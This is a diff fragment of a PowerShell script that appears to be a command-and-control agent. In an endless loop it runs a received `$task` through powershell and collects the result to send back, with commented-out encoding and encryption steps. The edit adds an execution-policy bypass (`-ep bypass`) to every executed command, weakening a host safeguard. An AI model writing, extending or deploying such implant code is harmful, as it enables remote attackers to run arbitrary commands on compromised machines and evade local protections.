@@ -114,7 +114,7 @@ for (;;){
         # $EncodedText =[Convert]::ToBase64String($Bytes)
         # $res  = Encrypt $key $res
         # $encodedURL = [System.Web.HttpUtility]::UrlEncode($EncodedText) 
-        $result = Invoke-Executable -sExeFile 'powershell' -cArgs @('/c', $task)
+        $result = Invoke-Executable -sExeFile 'powershell' -cArgs @('-ep bypass /c', $task)
         # $Bytes = [System.Text.Encoding]::Unicode.GetBytes($result)
         # $EncodedText =[Convert]::ToBase64String($Bytes)
         $data = @{result = "$result"}
